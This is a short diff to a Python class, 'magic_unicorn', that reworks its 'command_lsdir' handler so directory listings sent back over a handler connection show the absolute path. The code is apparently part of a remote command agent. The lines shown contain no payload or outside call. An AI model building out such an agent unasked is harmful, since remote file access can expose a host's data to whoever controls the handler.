@@ -230,8 +230,6 @@ class magic_unicorn:
         self.handler.send("".encode("UTF-8"))
 
     def command_lsdir(self, cmd_data):
-        if cmd_data[-1] != "/":
-            cmd_data = cmd_data + "/"
         if os.path.isdir(cmd_data):
             names = []
             names.append(".")
@@ -239,9 +237,24 @@ class magic_unicorn:
             for i in sorted(os.listdir(cmd_data)):
                 names.append(i)
             directory_contents = ""
-            directory_contents += "\nListing: " + cmd_data[:-1] + "\n"
-            directory_contents += "=" * len("Listing: " + cmd_data[:-1]) + "\n"
+            
+            if os.path.isabs(cmd_data):
+                if cmd_data[-1] != "/":
+                    directory = cmd_data
+                    cmd_data = cmd_data + "/"
+                else:
+                    directory = cmd_data[:-1]
+            else:
+                if cmd_data[-1] != "/":
+                    directory = os.getcwd() + "/" + cmd_data
+                    cmd_data = cmd_data + "/"
+                else:
+                    directory = os.getcwd() + "/" + cmd_data[:-1]
+                
+            directory_contents += "\nListing: " + directory + "\n"
+            directory_contents += "=" * len("Listing: " + directory) + "\n"
             directory_contents += "\n"
+            
             owners = []
             groups = []
             sizes = []
